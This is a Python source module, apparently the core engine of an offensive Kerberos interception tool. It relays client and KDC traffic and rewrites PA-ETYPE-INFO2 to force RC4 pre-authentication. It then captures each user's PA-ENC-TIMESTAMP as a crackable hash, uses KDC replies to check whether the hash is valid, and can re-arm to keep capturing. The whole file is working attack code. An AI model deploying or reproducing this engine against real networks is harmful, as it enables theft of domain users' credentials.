from __future__ import annotations

from dataclasses import dataclass, field

from . import krb
from .config import Config, Mode
from .hashes import Credential, UnsupportedEtypeError, build_credential
from .state import Phase, PrincipalState, Registry, Session


@dataclass
class EngineResult:
    forward: bytes | None = None
    reply_to_client: bytes | None = None
    close: bool = False
    credentials: list[Credential] = field(default_factory=list)
    log_lines: list[str] = field(default_factory=list)
    debug_lines: list[str] = field(default_factory=list)
    verdicts: list[tuple[str, bool]] = field(default_factory=list)


class Engine:
    def __init__(self, config: Config, registry: Registry) -> None:
        self.config = config
        self.registry = registry

    def handle_client_frame(self, session: Session, raw_frame: bytes) -> EngineResult:
        result = EngineResult(forward=raw_frame)
        root = krb.parse_frame(raw_frame)
        if root is None:
            result.debug_lines.append(
                f"[{session.client_ip}] unparsable frame, forwarding as-is"
            )
            return result
        result.debug_lines.append(
            f"[{session.client_ip}] C->KDC {krb.describe_frame(root)}"
        )

        req_body = krb.as_req_body(root)
        if req_body is None:
            return result

        username, realm = krb.extract_principal(req_body)
        principal = f"{username}@{realm}"
        key = (session.client_ip, principal)
        session.principal = key
        state = self.registry.get(key)

        if not self.config.machines and krb.is_machine_account(username):
            if state.phase is not Phase.PASSTHROUGH:
                self._set_phase(
                    result,
                    session,
                    principal,
                    state,
                    Phase.PASSTHROUGH,
                    "machine-account",
                )
                state.passthrough_reason = "machine-account"
                result.log_lines.append(
                    f"[{session.client_ip}] {principal}: machine account -- passing through "
                    "untouched, not capturing (use --machines to target it anyway)"
                )
            return result

        pa_ts = krb.extract_pa_enc_timestamp(root)
        if pa_ts is not None:
            etype, cipher_hex = pa_ts
            self._capture(
                result,
                session,
                principal,
                username,
                realm,
                etype,
                cipher_hex,
                state.salt,
                state,
            )
            if state.phase is Phase.DOWNGRADE and state.saved_error is not None:
                if etype == state.target_etype:
                    self._set_phase(result, session, principal, state, Phase.CAPTURED)
                    result.forward = None
                    result.reply_to_client = krb.build_capture_reply(
                        state.saved_error, etype
                    )
                    result.close = True
                    result.debug_lines.append(
                        f"[{session.client_ip}] {principal}: downgrade to etype {etype} succeeded, releasing client"
                    )
                else:
                    gave_up = self._bump_attempts(result, session, principal, state)
                    if not gave_up:
                        result.log_lines.append(
                            f"[{session.client_ip}] {principal}: answered with etype {etype}, "
                            f"not the downgrade target {state.target_etype} (attempt {state.attempts})"
                        )
            return result

        if state.phase is Phase.PROBE:
            if krb.is_fast_armored(root):
                self._set_phase(
                    result, session, principal, state, Phase.PASSTHROUGH, "fast"
                )
                state.passthrough_reason = "fast"
                result.log_lines.append(
                    f"[{session.client_ip}] {principal}: FAST-armored (PA-FX-FAST) -- pre-auth is "
                    "integrity-protected, downgrade not possible; machine-account AS-REQs remain "
                    "unarmored and are still targetable with --machines"
                )
                return result

            offered = krb.extract_offered_etypes(req_body)
            target = self._pick_target(offered)
            if target is None:
                self._set_phase(
                    result,
                    session,
                    principal,
                    state,
                    Phase.PASSTHROUGH,
                    "no-downgradable-etype",
                )
                state.passthrough_reason = "no-downgradable-etype"
                result.log_lines.append(
                    f"[{session.client_ip}] {principal}: no RC4 offered {offered} -- passthrough"
                )
            else:
                state.target_etype = target
                self._set_phase(
                    result,
                    session,
                    principal,
                    state,
                    Phase.DOWNGRADE,
                    f"target {target}",
                )
                result.log_lines.append(
                    f"[{session.client_ip}] {principal}: offered {offered}, targeting etype {target}"
                )
        return result

    def handle_kdc_frame(self, session: Session, raw_frame: bytes) -> EngineResult:
        result = EngineResult(forward=raw_frame)
        root = krb.parse_frame(raw_frame)
        if root is None:
            return result
        result.debug_lines.append(
            f"[{session.client_ip}] KDC->C {krb.describe_frame(root)}"
        )

        if krb.is_fast_armored(root):
            return result

        if session.principal is None:
            return result
        state = self.registry.get(session.principal)
        principal = session.principal[1]

        if krb.is_preauth_failed_error(root) or krb.is_as_rep(root):
            self._handle_verdict(result, session, principal, state, root)
            return result

        if not krb.is_preauth_required_error(root):
            return result

        if state.salt is None:
            state.salt = krb.extract_etype_info2_salt(root)

        if self.config.mode is not Mode.ACTIVE or state.phase is not Phase.DOWNGRADE:
            return result

        if self._bump_attempts(result, session, principal, state):
            return result

        target = state.target_etype
        if target is None:
            return result

        before = krb.extract_etype_info2_etypes(root)
        state.saved_error = raw_frame
        result.forward = krb.rewrite_etype_info2(raw_frame, target)
        result.debug_lines.append(
            f"[{session.client_ip}] {principal}: rewrote PA-ETYPE-INFO2 "
            f"{before} -> [{target}] (attempt {state.attempts})"
        )
        return result

    def _set_phase(
        self,
        result: EngineResult,
        session: Session,
        principal: str,
        state: PrincipalState,
        phase: Phase,
        note: str = "",
    ) -> None:
        old = state.phase
        state.phase = phase
        suffix = f" ({note})" if note else ""
        result.debug_lines.append(
            f"[{session.client_ip}] {principal}: {old.name} -> {phase.name}{suffix}"
        )

    def _handle_verdict(
        self,
        result: EngineResult,
        session: Session,
        principal: str,
        state: PrincipalState,
        root,
    ) -> None:
        captured = state.phase is Phase.CAPTURED
        had_capture = state.has_pending_capture
        state.has_pending_capture = False
        if krb.is_preauth_failed_error(root):
            if had_capture:
                result.verdicts.append((principal, False))
                result.log_lines.append(
                    f"[{session.client_ip}] {principal}: KDC rejected the AS-REQ (wrong password) -- "
                    "hash(es) flagged invalid"
                    + (", re-arming downgrade for the next attempt" if captured else "")
                )
            if captured:
                self._rearm(result, session, principal, state)
        elif krb.is_as_rep(root):
            if had_capture:
                result.verdicts.append((principal, True))
            if not captured:
                if had_capture:
                    result.log_lines.append(
                        f"[{session.client_ip}] {principal}: KDC accepted the AS-REQ -- hash(es) verified valid"
                    )
            elif self.config.keep_downgrading:
                if had_capture:
                    result.log_lines.append(
                        f"[{session.client_ip}] {principal}: KDC accepted the retry -- "
                        "hash(es) verified valid; re-arming (--keep-downgrading)"
                    )
                self._rearm(result, session, principal, state)
            else:
                self._set_phase(
                    result, session, principal, state, Phase.PASSTHROUGH, "verified"
                )
                state.passthrough_reason = "verified"
                if had_capture:
                    result.log_lines.append(
                        f"[{session.client_ip}] {principal}: KDC accepted the retry -- "
                        "hash(es) verified valid; standing down"
                    )

    def _rearm(
        self,
        result: EngineResult,
        session: Session,
        principal: str,
        state: PrincipalState,
    ) -> None:
        self._set_phase(result, session, principal, state, Phase.PROBE, "re-armed")
        state.target_etype = None
        state.attempts = 0
        state.saved_error = None
        state.passthrough_reason = None

    def _pick_target(self, offered: list[int]) -> int | None:
        return 23 if 23 in offered else None

    def _bump_attempts(
        self,
        result: EngineResult,
        session: Session,
        principal: str,
        state: PrincipalState,
    ) -> bool:
        state.attempts += 1
        if state.attempts > self.config.max_downgrade_attempts:
            self._set_phase(
                result,
                session,
                principal,
                state,
                Phase.PASSTHROUGH,
                "attempts exhausted",
            )
            result.log_lines.append(
                f"[{session.client_ip}] {principal}: "
                f"{state.attempts} downgrade attempts with no capture -- giving up, passthrough"
            )
            return True
        return False

    def _capture(
        self,
        result: EngineResult,
        session: Session,
        principal: str,
        username: str,
        realm: str,
        etype: int,
        cipher_hex: str,
        salt: str | None,
        state: PrincipalState,
    ) -> None:
        try:
            cred = build_credential(username, realm, etype, cipher_hex, salt)
        except (UnsupportedEtypeError, ValueError) as exc:
            result.log_lines.append(f"[{session.client_ip}] {principal}: {exc}")
            return
        result.credentials.append(cred)
        state.has_pending_capture = True
        result.debug_lines.append(
            f"[{session.client_ip}] {principal}: captured etype {etype} PA-ENC-TIMESTAMP "
            f"({len(cipher_hex) // 2} bytes cipher)"
        )
